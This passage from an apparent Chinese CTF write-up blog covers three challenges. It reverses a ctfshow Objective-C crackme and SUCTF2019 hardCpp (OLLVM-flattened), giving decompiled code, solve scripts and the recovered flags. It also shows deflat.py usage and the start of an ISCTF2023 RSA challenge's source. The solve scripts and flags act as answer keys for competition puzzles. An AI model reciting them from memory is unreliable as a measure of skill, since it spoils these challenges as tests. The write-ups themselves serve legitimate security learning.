class="number">000055</span>EC019DF5E0 C0 F1 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aV2408q16                     ; <span class="string">&quot;v24@0:8Q16&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF5E8 <span class="number">70</span> C3 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset sub_55EC019DC370</span><br><span class="line">.data:<span class="number">000055</span>EC019DF5F0 CD F0 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aB                            ; <span class="string">&quot;B:&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF5F8 D0 F1 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aC2408q16_0                   ; <span class="string">&quot;C24@0:8Q16&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF600 <span class="number">4F</span> C3 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset sub_55EC019DC34F</span><br><span class="line">.data:<span class="number">000055</span>EC019DF608 D0 F0 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset asc_55EC019DF0D0              ; <span class="string">&quot;X:&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF610 C0 F1 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aV2408q16                     ; <span class="string">&quot;v24@0:8Q16&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF618 <span class="number">25</span> C3 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset sub_55EC019DC325</span><br></pre></td></tr></table></figure><p>可以发现 R&#x2F;I&#x2F;… 这些是类 后面的第三项是类中的方法(应该是) 第二项是类似签名这种<br>那么我们对于每个只需要关注它所调用的方法即可<br>发现正是前面找到的xor&#x2F;add&#x2F;mov等操作</p><p>知道这点后 逐个分析还原加密逻辑 逆向回去即可<br>注意 enc是sub_55EC019DC7A6 刚刚分析的奇偶xor是在input下调用的</p><p>input下的加密就作了 xor 0x4E1*i 的操作<br>注意到Y对应的 *(_QWORD *)(a1 + 8) &#x3D; a3 ^ *(_QWORD *)(a1 + 16);<br>事实上这里静态还是很麻烦的 但是Linux要运行Object-C也比较麻烦…<br>好像明白了 cal里的第二个循环看似正序 其实</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0LL</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)(a1 + <span class="number">16</span>) - <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v10 = *(_QWORD *)(a1 + <span class="number">8</span>);</span><br><span class="line">    v11 = (__int64 (__fastcall *)(__int64, <span class="type">char</span> **, <span class="type">unsigned</span> __int64))<span class="built_in">objc_msg_lookup</span>(v10, OBJECT_AT_INDEX);</span><br><span class="line">    v12 = <span class="built_in">v11</span>(v10, OBJECT_AT_INDEX, *(_QWORD *)(a1 + <span class="number">16</span>) - j - <span class="number">1</span>);</span><br><span class="line">    v13 = (<span class="built_in">void</span> (__fastcall *)(__int64, <span class="type">char</span> **, __int64))<span class="built_in">objc_msg_lookup</span>(v12, A_XOR);</span><br><span class="line">    v14 = *(_QWORD *)(a1 + <span class="number">8</span>);</span><br><span class="line">    v15 = (__int64 (__fastcall *)(__int64, <span class="type">char</span> **, <span class="type">unsigned</span> __int64))<span class="built_in">objc_msg_lookup</span>(v14, OBJECT_AT_INDEX);</span><br><span class="line">    v16 = <span class="built_in">v15</span>(v14, OBJECT_AT_INDEX, *(_QWORD *)(a1 + <span class="number">16</span>) - j - <span class="number">2</span>);</span><br><span class="line">    v17 = (__int64 (__fastcall *)(__int64, <span class="type">char</span> **))<span class="built_in">objc_msg_lookup</span>(v16, R_MOV);</span><br><span class="line">    v18 = <span class="built_in">v17</span>(v16, R_MOV);</span><br><span class="line">    <span class="built_in">v13</span>(v12, A_XOR, v18);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>注意取得是 *(_QWORD *)(a1 + 16) - j - 1<br>*(_QWORD *)(a1 + 16)  - 1 是len 也就是取得 len-1  len-2  …  woc  所以是倒序…<br>注意A对应的xor</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_55EC019DC370</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">8</span>) ^= a3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以这里是 [len-1-j] ^&#x3D; [len-1-j-1]</p><p>但是奇偶项加密的+ ^ 顺序静态还是没找出来… 动调应该能秒出  但是我懒得安依赖库了…</p><p>最后解密长这样:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">1270</span>, <span class="number">2767</span>, <span class="number">5549</span>, <span class="number">9672</span>, <span class="number">11938</span>, <span class="number">16093</span>, <span class="number">29864</span>, <span class="number">30379</span>, <span class="number">22184</span>, <span class="number">20690</span>, <span class="number">25002</span>,</span><br><span class="line">        <span class="number">65039</span>, <span class="number">65793</span>, <span class="number">97983</span>, <span class="number">100411</span>, <span class="number">67904</span>, <span class="number">88053</span>, <span class="number">28147</span>, <span class="number">18776</span>, <span class="number">71764</span>, <span class="number">127654</span>,</span><br><span class="line">        <span class="number">39994</span>, <span class="number">30276</span>, <span class="number">33151</span>, <span class="number">49377</span>, <span class="number">62682</span>, <span class="number">128398</span>, <span class="number">32406</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x4E1</span> * i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">28</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        data[i] ^= data[i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data[i] -= data[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        data[i] ^= data[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data[i] -= data[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i] ^ key[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>ctfshow{babyＯｂｊＣ,你真的解出来了TQL}</strong></p><h2 id="SUCTF2019-hardCpp"><a href="#SUCTF2019-hardCpp" class="headerlink" title="SUCTF2019 hardCpp"></a>SUCTF2019 hardCpp</h2><p>ollvm解混淆平坦化后是这种:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v27 = argc;</span><br><span class="line">  v26 = argv;</span><br><span class="line">  v25 = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;func(?)=\&quot;01abfc750a0c942167651c40d088531d\&quot;?&quot;</span>);</span><br><span class="line">  s = <span class="built_in">getchar</span>();</span><br><span class="line">  <span class="built_in">fgets</span>(v20, <span class="number">21</span>, stdin);</span><br><span class="line">  v18 = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  v17 = v18 - v25;</span><br><span class="line">  v29 = v18 - v25;</span><br><span class="line">  <span class="keyword">if</span> ( v18 - v25 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let the silent second hand take the place of my doubt...&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v30 = v16 != <span class="number">21</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 != <span class="number">21</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">21</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v17 ^ v20[i - <span class="number">1</span>];</span><br><span class="line">    v13[<span class="number">0</span>] = main::$_0::<span class="built_in">operator</span>()(v23, (<span class="type">unsigned</span> <span class="type">int</span>)v14);</span><br><span class="line">    v12[<span class="number">0</span>] = main::$_1::<span class="built_in">operator</span>()(v21, (<span class="type">unsigned</span> <span class="type">int</span>)*(&amp;s + v17 + i - <span class="number">1</span>));</span><br><span class="line">    v3 = main::$_1::<span class="built_in">operator</span>() <span class="built_in">const</span>(<span class="type">char</span>)::&#123;<span class="built_in">lambda</span>(<span class="type">int</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(v12, <span class="number">7LL</span>);</span><br><span class="line">    v14 = main::$_0::<span class="built_in">operator</span>() <span class="built_in">const</span>(<span class="type">char</span>)::&#123;<span class="built_in">lambda</span>(<span class="type">char</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(v13, (<span class="type">unsigned</span> <span class="type">int</span>)v3);</span><br><span class="line">    v11[<span class="number">0</span>] = main::$_2::<span class="built_in">operator</span>()(v24, (<span class="type">unsigned</span> <span class="type">int</span>)v14);</span><br><span class="line">    v10[<span class="number">0</span>] = main::$_2::<span class="built_in">operator</span>()(v24, (<span class="type">unsigned</span> <span class="type">int</span>)*(&amp;s + v17 + i - <span class="number">1</span>));</span><br><span class="line">    v4 = main::$_2::<span class="built_in">operator</span>() <span class="built_in">const</span>(<span class="type">char</span>)::&#123;<span class="built_in">lambda</span>(<span class="type">char</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(v10, <span class="number">18LL</span>);</span><br><span class="line">    v9[<span class="number">0</span>] = main::$_3::<span class="built_in">operator</span>()(v22, (<span class="type">unsigned</span> <span class="type">int</span>)v4);</span><br><span class="line">    v5 = main::$_3::<span class="built_in">operator</span>() <span class="built_in">const</span>(<span class="type">char</span>)::&#123;<span class="built_in">lambda</span>(<span class="type">char</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(v9, <span class="number">3LL</span>);</span><br><span class="line">    v8[<span class="number">0</span>] = main::$_0::<span class="built_in">operator</span>()(v23, (<span class="type">unsigned</span> <span class="type">int</span>)v5);</span><br><span class="line">    v6 = main::$_0::<span class="built_in">operator</span>() <span class="built_in">const</span>(<span class="type">char</span>)::&#123;<span class="built_in">lambda</span>(<span class="type">char</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(v8, <span class="number">2LL</span>);</span><br><span class="line">    v14 = main::$_2::<span class="built_in">operator</span>() <span class="built_in">const</span>(<span class="type">char</span>)::&#123;<span class="built_in">lambda</span>(<span class="type">char</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(v11, (<span class="type">unsigned</span> <span class="type">int</span>)v6);</span><br><span class="line">    <span class="keyword">if</span> ( enc[i - <span class="number">1</span>] != v14 )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You win&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点分析下那些lambda<br>第1,2个都是直接返回a2<br>第3个是取模<br>第4个比较重要:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main::$_0::<span class="built_in">operator</span>() <span class="built_in">const</span>(<span class="type">char</span>)::&#123;<span class="built_in">lambda</span>(<span class="type">char</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(__int64 a1, <span class="type">char</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+23h] [rbp-1Dh]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// [rsp+2Bh] [rbp-15h]</span></span><br><span class="line"></span><br><span class="line">  v11 = <span class="number">1</span>;</span><br><span class="line">  v12 = y_6 &lt; <span class="number">10</span>;</span><br><span class="line">  v9 = a2;</span><br><span class="line">  v8 = a1;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">-1418698808</span>;</span><br><span class="line">  v7 = <span class="number">-1418698808</span>;</span><br><span class="line">  v6 = <span class="number">618368500</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v3 = (<span class="type">char</span> *)a1;</span><br><span class="line">  *((_BYTE *)&amp;v3 - <span class="number">16</span>) = a2;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)(*((<span class="type">char</span> *)&amp;v3 - <span class="number">16</span>) + *v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里进行的是字符串相加的操作!<br>第5个还是返回<br>第6个也还是返回<br>第7个是异或18<br>第8个还是返回<br>第9个是相乘<br>第10个还是返回<br>第11个字符串相加<br>第12个xor</p><p>注意一个小细节 v20[i - 1] 和 &amp;s + zero + i - 1<br>s是在v20前面一位的 所以相当于是0~20相邻两个进行加密处理<br>大致得到这样的加密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">    v14 = a[i]</span><br><span class="line">    v13 = v14</span><br><span class="line">    v12 = a[i-<span class="number">1</span>]</span><br><span class="line">    v3 = v12%<span class="number">7</span></span><br><span class="line">    v14 = v13+v3</span><br><span class="line">    v10 = a[i-<span class="number">1</span>]</span><br><span class="line">    v4 = v10^<span class="number">18</span></span><br><span class="line">    v9 = v4</span><br><span class="line">    v5 = v9*<span class="number">3</span></span><br><span class="line">    v6 = v5+<span class="number">2</span></span><br><span class="line">    v14 ^= v6</span><br><span class="line">    check = enc[i-<span class="number">1</span>]==v14</span><br><span class="line"></span><br><span class="line">check = (a[i]+a[i-<span class="number">1</span>]%<span class="number">7</span>)^((a[i-<span class="number">1</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)==enc[i-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>爆破下s即可<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span>]</span><br><span class="line"><span class="comment"># check = (a[i]+a[i-1]%7)^((a[i-1]^18)*3+2)==enc[i-1]</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">    a = []</span><br><span class="line">    a.append(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        x = enc[i]^(((a[-<span class="number">1</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>))</span><br><span class="line">        a.append(((x-a[-<span class="number">1</span>]%<span class="number">7</span>))&amp;<span class="number">0xff</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(a))</span><br><span class="line"><span class="string">b&#x27;#flag&#123;mY-CurR1ed_Fns&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag:<br><strong>flag{mY-CurR1ed_Fns}</strong></p><hr><hr><p>顺便记录一下另一个基于angr符号执行的deflat.py<br>用法:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 deflat.py hardCpp 0x4007E0</span><br><span class="line">python3 deflat.py xxx startaddr</span><br></pre></td></tr></table></figure><p>虽说感觉弄完后还没有D810插件弄得清晰 但是也了解一下用法 工具互补<br>这个deflat.py有个好处是他的汇编也是跟着优化了的 所以动调的话还是用这个工具来平坦化舒适的多</p>]]></content>
      
      
      <categories>
          
          <category> CTF-Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF2023</title>
      <link href="/ISCTF2023/"/>
      <url>/ISCTF2023/</url>
      
        <content type="html"><![CDATA[<p>没有全部记录<br>Crypto和Reverse记录的赛时没做出来的题 其他是作为新手学习记录</p><span id="more"></span><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,getrandbits</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> factorial <span class="keyword">as</span> factor</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime <span class="keyword">as</span> is_strongPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">step1</span>(<span class="params">m</span>):</span><br><span class="line">p,q = getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=getPrime(<span class="number">512</span>)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> gcd(e,phi) != <span class="number">1</span>:</span><br><span class="line">e=getPrime(<span class="number">512</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e,-<span class="number">1</span>,phi)</span><br><span class="line">k = randint(<span class="number">800</span>,<span class="number">1500</span>)</span><br><span class="line">f = factor(k)</span><br><span class="line">leak = (<span class="built_in">pow</span>(e, <span class="number">2</span>) + (e*d - <span class="number">1</span>)*f)*getPrime(<span class="number">256</span>) + k</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n=&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;leak=&#125;</span>&quot;</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">step2</span>(<span class="params">m</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> key &lt; <span class="number">10</span>**<span class="number">9</span></span><br><span class="line"><span class="keyword">assert</span> (is_prime(key) <span class="keyword">and</span> <span class="keyword">not</span> is_strongPrime(key))</span><br><span class="line"></span><br><span class="line">p,q = getPrime(<span class="number">512</span>),getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">leak1 = <span class="built_in">pow</span>(p,q,n) + <span class="built_in">pow</span>(q,p,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n=&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;leak1=&#125;</span>&quot;</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">seed = getrandbits(<span class="number">64</span>)</span><br><span class="line">a = getPrime(<span class="number">256</span>)</span><br><span class="line">b = getPrime(<span class="number">256</span>)</span><br><span class="line">leak2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">leak2.append(seed := (seed * a + b) % p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;leak2 = &#125;</span>&quot;</span>)</span><br><span class="line">seed = (seed * a + b) % p</span><br><span class="line">base = key ^ seed</span><br><span class="line">final = []</span><br><span class="line"><span class="keyword">while</span> c &gt; <span class="number">0</span>:</span><br><span class="line">final.append(c % base)</span><br><span class="line">c //= base</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">p</span>):</span><br><span class="line">check = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>]</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">all</span>([<span class="built_in">pow</span>(i,p-<span class="number">1</span>,p)==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> check])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;step1:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,step1(s2n(flag[<span class="number">0</span>])))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;step2:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;final =&quot;</span>,step2(s2n(flag[<span class="number">1</span>])))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 